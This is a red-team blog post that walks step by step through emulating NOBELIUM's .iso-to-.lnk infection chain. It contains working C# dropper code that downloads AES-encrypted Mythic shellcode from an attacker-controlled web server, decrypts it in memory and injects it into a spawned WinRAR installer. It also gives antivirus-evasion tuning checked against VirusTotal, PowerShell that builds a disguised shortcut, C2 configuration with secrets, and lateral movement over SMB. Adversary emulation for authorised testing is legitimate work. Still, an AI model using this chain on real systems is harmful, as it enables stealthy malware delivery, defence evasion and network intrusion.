---
title: APT Emulation - Nobellium
date: 2022-06-01 09:48:47 +07:00
categories: RedTeaming
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: APT Emulation - Nobellium
#thumbnail: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
#image: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
---

<!-- TOC start (generated with https://github.com/derlin/bitdowntoc) -->

- [Introduction to APT Emulation](#introduction-to-apt-emulation)
   * [Setup Mythic ](#setup-mythic)
   * [Generate Mythic shellcode](#generate-mythic-shellcode)
   * [AES Encrypt the Apollo Shellcode ](#aes-encrypt-the-apollo-shellcode)
   * [Rewrite Hellsgate to make it a shellcode dropper/injector](#rewrite-hellsgate-to-make-it-a-shellcode-dropperinjector)
      + [Improving Evasion](#improving-evasion)
      + [Incoporating the Shellcode Decryptor and Dropper](#incoporating-the-shellcode-decryptor-and-dropper)
   * [Create the malicious .lnk](#create-the-malicious-lnk)
   * [Create an ISO](#create-an-iso)
   * [Payload Emulation](#payload-emulation)
   * [Lateral Movement](#lateral-movement)
   * [Analysis](#analysis)

<!-- TOC end -->

<!-- TOC --><a name="introduction-to-apt-emulation"></a>
## Introduction to APT Emulation

As a pentester or Red teamer it is important to perform adversary simulation simulating actual adversary actions. To do so, it is a good exercise to emulate attacker chains to execute in actual engagements and Red Team operations. Here is an example inspired from [NOBELLIUM's](https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/) unique infection attack chain.
In this case we bypass defenses on the target that include Windows Defender and ATP.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817163642.png)

The attack chain is as follows:

- `.iso` --> `.lnk` --> `Dropper/Injector.exe` --> `LegitInstaller.exe`

In this scenario, we assume that a malicious `.iso` file was downloaded from the internet / was download via `HTML Smuggling` techniques. Usually `.iso` files contain installers (Ex: Games). To emulate this I've used the simple `winrar` project. Once the `.iso` file is opened or mounted 3 files appear. 

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220824161512.png)

As the names suggest the user would misdirected to click on the malicious `.lnk` setup file which would inturn execute the `HellsGateDropper/Injector` (`winrar-x64-611-check.exe`). If examined, this would look like a normal check but in the background it downloads AES encrypted shellcode, decrypts it on the fly, spawns the legitimate `winrar-x64-611.exe` setup file and injects shellcode into the trusted installer. 

From an user's standpoint after clicking on the `.lnk` setup the trusted installer is spawned, deeming the execution non malicious but in the background a lot more malicious events occur.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032107.png)

Since the shellcode is injected into the trusted installer, it would live for as along as the process is terminated. It is recommended to chain this along with persistence techniques, but that is out of scope for this assignment.

<!-- TOC --><a name="setup-mythic"></a>
### Setup Mythic 

Refer Mythic documentation from: https://docs.mythic-c2.net/installation

Install Mythic on kali: 

```
kali> git clone https://github.com/its-a-feature/Mythic

kali> ./install_docker_kali.sh
```

Install the `Apollo` agent (windows) along with `http`, `tcp`, `smb` c2 profiles from the appropriate github repos at:

	- C2 profiles: https://github.com/MythicC2Profiles

	- C2 agents: https://github.com/MythicAgents

```
kali> sudo ./mythic-cli install github https://github.com/user/repo
```

Generate a self signed certificate and private key to use `https` egress.

```
kali> cd C2_Profiles/HTTP/c2_code


kali> openssl req -newkey rsa:4096  -x509  -sha512  -days 365 -nodes -out certificate.pem -keyout privatekey.pem
```

Edit `config.json` to have the `key_path` and `cert_path` variables be the name of the private key and cert you just generated and set `https` to `true`  

```
kali> cat config.json            
{
  "instances": [
  {
    "ServerHeaders": {
      "Server": "NetDNA-cache/2.2",
      "Cache-Control": "max-age=0, no-cache",
      "Pragma": "no-cache",
      "Connection": "keep-alive",
      "Content-Type": "application/javascript; charset=utf-8"
    },
    "port": 80,
    "key_path": "priv.pem",
    "cert_path": "cert.pem",
    "debug": false,
    "use_ssl": true,
    "payloads": {}
    }
  ]
}
```

Gather `mythic_admin` creds from the `.env` file:

```
kali> cat .env
ALLOWED_IP_BLOCKS="0.0.0.0/0"
COMPOSE_PROJECT_NAME="mythic"
DEFAULT_OPERATION_NAME="Operation Chimera"
DOCUMENTATION_BIND_LOCALHOST_ONLY="true"
DOCUMENTATION_HOST="mythic_documentation"
DOCUMENTATION_PORT="8090"
EXCLUDED_C2_PROFILES=
EXCLUDED_PAYLOAD_TYPES=
HASURA_BIND_LOCALHOST_ONLY="true"
HASURA_EXPERIMENTAL_FEATURES="streaming_subscriptions"
HASURA_HOST="mythic_graphql"
HASURA_PORT="8080"
HASURA_SECRET="Uc9xJZPnqg54c8X1U6e330fbXriVhX"
JWT_SECRET="waa5kT8WgX8UEyBejK2ihyqvClgISq"
MYTHIC_ADMIN_PASSWORD="zQEGtvisToeWEFzaKWSSGZQw9hzWuh"
MYTHIC_ADMIN_USER="mythic_admin"
[..................................]
```

Start the Mythic C2 and visit: https://127.0.0.1:7443 using a browser and login.

```
kali> ./mythic-cli start 
```

<!-- TOC --><a name="generate-mythic-shellcode"></a>
### Generate Mythic shellcode

Go to the `Payloads` tab --> `Actions` drop down --> click `Generate New Payload`

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817164505.png)

Select Target Operating System as `Windows` and click `Next`:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817164648.png)

Select Output as `Shellcode`:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817164743.png)

Select only `load` (other commands can be loaded later using this if needed) `upload`, `exit`, `link` and `unlink` to keep the agent as small as possible and then click `Next`:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817165222.png)

In C2 profiles select `http`: 

- Set `Callback Host` to the IP address of the kali host: `https://192.168.73.134`

- Set `callback_interval` to `60` (long sleep times improve OPSEC)

- Change the `HTTP Headers` --> `User Agent`  to something new and plausible to `Windows 10`: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36`

- Change the `Name of the query parameter for GET requests` to something custom like `winrarq` and the same with `POST request URI` to something like `winrardata` and click `Next`

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817170153.png)

Name the payload and click `Create Payload`

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817170425.png)

A payload should be generate in the `Payloads` tab. Download it and transfer it to a Windows machine.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817170627.png)

<!-- TOC --><a name="aes-encrypt-the-apollo-shellcode"></a>
### AES Encrypt the Apollo Shellcode 

Encrypting shellcode helps evade analysis from web proxies and network analyzers. 

[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) has a useful powershell called [Invoke-SharpEncrypt.ps1](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpEncrypt.ps1) which is useful to aes encrypt shellcode using a password.

Parts of [Invoke-SharpLoader.ps1](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpLoader.ps1) have been incoporated in the Hells Gate project shown below to decrypt the aes shellcode.

Import [Invoke-SharpEncrypt.ps1](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpEncrypt.ps1)  and aes encrypt the shellcode:

```
PS D:\Interview\Invoke-SharpLoader> . .\Invoke-SharpEncrypt.ps1
PS D:\Interview\Invoke-SharpLoader> Invoke-SharpEncrypt -file D:\Interview\Invoke-SharpLoader\apollo.bin -password ILoveMythic -outfile D:\Interview\Invoke-SharpLoader\winrar.enc
   ______                ____                       __
  / __/ /  ___ _______  / __/__  __________ _____  / /_
 _\ \/ _ \/ _ /__/ _ \/ _// _ \/ __/ __/ // / _ \/ __/
/___/_//_/\_,_/_// .__/___/_//_/\__/_/  \_, / .__/\__/
                /_/                    /___/_/

                       Compress and AES encrypt files

[*] First Read All Bytes.                                 -> Done
[*] AES Encrypt our Bytes.                                -> Done
[*] Now let's Compress our Bytes.                         -> Done
[*] And finally encode our Bytes as a Base64 string.      -> Done

[!] Base64 string saved as D:\Interview\Invoke-SharpLoader\winrar.enc
```

- Setup a webserver to host the payload using WSL/Ubuntu: 

```
root@GHOUL:/mnt/d/Interview/Invoke-SharpLoader# sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

<!-- TOC --><a name="rewrite-hellsgate-to-make-it-a-shellcode-dropperinjector"></a>
### Rewrite Hellsgate to make it a shellcode dropper/injector

Since the task was to bypass defender, it would be really simple to create a script to disable defender and have code execution after but in my experience I find that not OPSEC safe and very loud. Hence it would be really nice to have code execution without any alerts or footprints hence I chose the `HellsGate VX` technique to evade most EDR's/AV's.

`HellsGate VX`  takes a more archaic approach - rather invoking system calls; the VX relies on well-established methodologies, the run-time reproduction of `LoadLibrary`, `GetProcAddress`, and `FreeLibrary`. This method has been sufficient in nullifying the PE files `Import Address Table` (IAT) as well as evading rudimentary heuristic analysis. In short this techique pseudo-disassembling `NTDLL` to retrieve the appropriate syscalls. 

An advantage this technique has over well defined syscall techniques like `SysWhispers` is that `SysWhispers` relies solely on statically defined syscall numbers and techniques like `HellsGate VX` self-resolves syscalls without the need of static elements.

<!-- TOC --><a name="improving-evasion"></a>
#### Improving Evasion

This C# implementation of `HellsGate`  is used as a base template: https://github.com/sbasu7241/HellsGate

Compiling from source using `Visual Studio 2019` without changing anything we have 20 detections:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817201913.png)

Analyzing with a decompiler: `ILSpy`

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817202621.png)

It most likely looks like the detections arise from:

- Function, namespace, variable names.

- Comments for verbosity

- Shellcode (MSF generated shellcode) is a heavy indicator

Change the above manually

- In Visual Studio, use `CTRL` + `SHFT` + `H` to `search and replace` in all files: replace words like `HellsGate` to `HellG`

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817203025.png)

- Rewrite comments for verbosity (`Console.WriteLine()` statements) to break any signatures from them as follows:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817203258.png)

Replace the shellcode to a something non malicious like a nullbyte to test if the detection was from the shellcode:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817203426.png)

Rebuild the project and upload it on Virus Total: We see that it bypass's Microsoft defender/ATP and has lessened detections to 8.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817203731.png)

Rewriting and adding more functionality to the code should improve the detections a bit.

<!-- TOC --><a name="incoporating-the-shellcode-decryptor-and-dropper"></a>
#### Incoporating the Shellcode Decryptor and Dropper

Here we add code sections to download and decrypt the encrypted shellcode from a hosted webserver (dropper) along with that parts to spawn the legitimate `winrar` executable and inject shellcode into it.

The idea basically is that when say the malicious `.lnk` is executed, this program would be executed and would download the encrypted shellcode, decyrpt it in memory and next spawn the legitimate `winrar` installer and inject the decrypted shellcode in it. Basically the `.lnk` execution would seem legitimate as it ultimately spawns the `winrar` installer but is abused to inject shellcode in this legitimate installer.

We add hardcoded values to do away with arguments during execution.

Add these function protoype's before the `main()` function to add functions to decrypt the shellcode: ([Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) provides good insight for this)

```
// AES Decrypt Shellcode Prototype Definitions
public static string Get_Stage2(string url)
{
	try
	{
		HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);
		IWebProxy webProxy = myWebRequest.Proxy;
		if (webProxy != null)
		{
			webProxy.Credentials = CredentialCache.DefaultNetworkCredentials;
			myWebRequest.Proxy = webProxy;
		}
		HttpWebResponse response = (HttpWebResponse)myWebRequest.GetResponse();
		Stream data = response.GetResponseStream();
		string html = String.Empty;
		using (StreamReader sr = new StreamReader(data))
		{
			html = sr.ReadToEnd();
		}
		return html;
	}
	catch (Exception)
	{
		Console.ForegroundColor = ConsoleColor.Red;
		Console.WriteLine();
		Console.WriteLine("\n[!] Whoops, there was a issue with the url...");
		Console.ResetColor();
		return null;
	}
}

public static byte[] Base64_Decode(string encodedData)
{
	byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
	return encodedDataAsBytes;
}


public static byte[] Decompress(byte[] data)
{
	using (var compressedStream = new MemoryStream(data))
	using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
	using (var resultStream = new MemoryStream())
	{
		var buffer = new byte[32768];
		int read;
		while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
		{
			resultStream.Write(buffer, 0, read);
		}
		return resultStream.ToArray();
	}
}

public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
{
	byte[] decryptedBytes = null;
	byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
	using (MemoryStream ms = new MemoryStream())
	{
		using (RijndaelManaged AES = new RijndaelManaged())
		{
			try
			{
				AES.KeySize = 256;
				AES.BlockSize = 128;
				var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
				AES.Key = key.GetBytes(AES.KeySize / 8);
				AES.IV = key.GetBytes(AES.BlockSize / 8);
				AES.Mode = CipherMode.CBC;
				using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cs.Close();
				}
				decryptedBytes = ms.ToArray();
			}
			catch
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("[!] Whoops, something went wrong... Probably a wrong Password.");
				Console.ResetColor();
			}
		}
	}
	return decryptedBytes;
}
```

Remove the following lines in `main()`:

```
byte[] shellcode = new byte[] {0x00};


IntPtr alloc_size = new IntPtr(Convert.ToUInt32(shellcode.Length));

int processid = int.Parse(args[0]);
```

Replace it with the following to add dropper functionality i.e to download, decrypt the shellcode and to spawn the `winrar` installer and inject it into its memory.

```
string location = "http://192.168.0.115/winrar.enc";

Console.WriteLine(location);
HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(location);
IWebProxy webProxy = myWebRequest.Proxy;
if (webProxy != null)
{
	webProxy.Credentials = CredentialCache.DefaultNetworkCredentials;
	myWebRequest.Proxy = webProxy;
}
HttpWebResponse response = (HttpWebResponse)myWebRequest.GetResponse();
Stream data = response.GetResponseStream();
string html = String.Empty;
using (StreamReader sr = new StreamReader(data))
{
	html = sr.ReadToEnd();
}


Console.WriteLine("-> Done");
Console.Write("[*] Decrypting file in memory... > ");
string Password = "ILoveMythic";
Console.WriteLine();


byte[] decoded = Base64_Decode(html);

byte[] decompressed = Decompress(decoded);
Console.WriteLine(decompressed);
byte[] passwordBytes = Encoding.UTF8.GetBytes(Password);
passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
byte[] bytesDecrypted = AES_Decrypt(decompressed, passwordBytes);
int _saltSize = 4;
byte[] originalBytes = new byte[bytesDecrypted.Length - _saltSize];
for (int i = _saltSize; i < bytesDecrypted.Length; i++)
{
	originalBytes[i - _saltSize] = bytesDecrypted[i];
}
Console.WriteLine(originalBytes);
string decodedresult = System.Text.Encoding.UTF8.GetString(originalBytes);
Console.WriteLine(decodedresult);

Byte[] shellcode = originalBytes;

IntPtr alloc_size = new IntPtr(Convert.ToUInt32(shellcode.Length));

bool started = false;
var p = new Process();

p.StartInfo.FileName = "winrar-x64-611.exe";

started = p.Start();

var procId = p.Id;
Console.WriteLine("ID: " + procId);
int processid = procId;
```

Rebuild the project and upload the binary to VirusTotal: We now have only 5 detections:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817210442.png)

Download a `winrar` setup file from: https://www.win-rar.com/download.html?&L=0 and place it in the same folder. 

Recompile the `HellsGate.exe` executable this time with an icon in Visual Studio: Right click `HellsGate` in the `Solution Explorer` and click `Properties`

- Download a `winrar` icon from: http://www.rw-designer.com/icon-detail/21764

- Under the `Application` tab add an Icon via browsing to the download icon.

- Rename the `HellsGate.exe` file to `winrar-x64-611-check.exe`:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817230834.png)

Change executable permissions for  `winrar-x64-611-check`: Right click over the executable and select `Properties`

- Enable `Run as Admin`:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817231040.png)

<!-- TOC --><a name="create-the-malicious-lnk"></a>
### Create the malicious .lnk

Create a shortcut file with the same icon as before and this `.lnk` executes `winrar-x64-611-check.exe` (`HellsGateInjector/Dropper`) to remotely download and inject shellcode into  `winrar-x64-611.exe` (the legitimate installer).

```
$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("C:\Users\shari\Downloads\Test\winrar-x64-611-setup.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\cmd.exe"
$link.iconlocation = "C:\Users\shari\Downloads\winrar.ico"
$link.arguments = "/c winrar-x64-611-check.exe"
$link.save()
```

An alternate way of execution derived from the `Nobelium` attack is:

```
$link.targetpath = "C:\Windows\System32\rundll32.exe"
$link.arguments = "advpack.dll,RegisterOCX winrar-x64-611-check.exe"
```

<!-- TOC --><a name="create-an-iso"></a>
### Create an ISO

Download and install `AnyBurn` from: http://www.anyburn.com/thank-you-install-anyburn.htm

Say if the executable's in use were marked by the `MOTW flag` a suitable circumvent to remove this would be to use this project: https://github.com/mgeeky/PackMyPayload

Select `Create image file from files/folders`

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818013000.png)

Browse and add the folder including all 3 payload files.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818013118.png)

Next click `Create Now` with a suitable name.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818013212.png)

<!-- TOC --><a name="payload-emulation"></a>
### Payload Emulation

Setup a webserver to server using wsl/linux to serve the encrypted shellcode (`winrar.enc`)

```
root@GHOUL:/mnt/d/Interview/Invoke-SharpLoader# sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We are going to assume that the malicious iso was download from the internet / downloaded via `HTML Smuggling` techniques.

Mount / Execute the iso:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818015104.png)

Execute the benign `winrar-x64-611-setup` file

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818015326.png)

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818024714.png)

<!-- TOC --><a name="lateral-movement"></a>
### Lateral Movement

Generate Apollo shellcode same way as before but this time for the `SMB` profile:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818025010.png)

Say that we compromise credentials for another server from this host: Load the `make_token` and `link` modules: `load <command name>`

Create a new Credential using `make_token`

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818025532.png)

Reiterate the process to now encrypt the `SMB` shellcode and upload it on the `ADMIN$` share from Mythic using: `upload \\PACES-DC\C$\users\public\ winrar-x64-611.zip`

RDP into `PACES-DC`, expand the Archive and execute the malicious `.lnk` like before:

```
PS> Expand-Archive winrar-x64-611.zip

PS> .\winrar-x64-611-setup.lnk
```

Use Mythic to create a `link` to the SMB beacon on `PACES-DC`: `link PACES-DC`

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818031735.png)

<!-- TOC --><a name="analysis"></a>
### Analysis

Analysing using `Process Hacker 2`:

A single `winrar` process exist inside which the shellcode is injected:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032107.png)

Analysing memory there are no regions with `Execute` permissions:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032212.png)

Non existent parent process exists

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032417.png)

Analyzing modules we see that `amsi.dll` is loaded in the current process:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032319.png)

